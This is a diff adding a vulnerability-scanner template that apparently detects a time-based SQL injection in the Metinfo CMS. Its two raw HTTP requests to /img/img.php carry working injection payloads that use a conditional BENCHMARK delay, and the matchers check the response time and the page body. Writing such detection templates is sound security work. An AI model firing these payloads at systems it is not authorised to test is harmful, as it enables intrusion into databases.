@@ -1,0 +1,28 @@
+id: metinfo-sql-time-injection
+info:
+  name: Metinfo SQL Time-based Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects a SQL time-based injection vulnerability in Metinfo.
+    The vulnerability leverages improper input validation, allowing attackers to execute time-based payloads.
+  tags: sql-injection,time-based
+
+http:
+  - raw:
+      - |
+        GET /img/img.php?lang=metinfo&metinfover=1&class1=10001&imglistid=10001&met_img_list=1&param=11+procedure+analyse(extractvalue(rand(),concat(0x3a,(if((1=2),BENCHMARK(8000000,SHA1(1)),1)))),1) HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /img/img.php?lang=metinfo&metinfover=1&class1=10001&imglistid=10001&met_img_list=1&param=11+procedure+analyse(extractvalue(rand(),concat(0x3a,(if((hex(md5(123))=\"3230326362393632616335393037356239363462303731353264323334623730\"),BENCHMARK(8000000,SHA1(1)),1)))),1) HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "response_time > 4"
+      - type: word
+        words:
+          - "MetInfo"
+        part: body
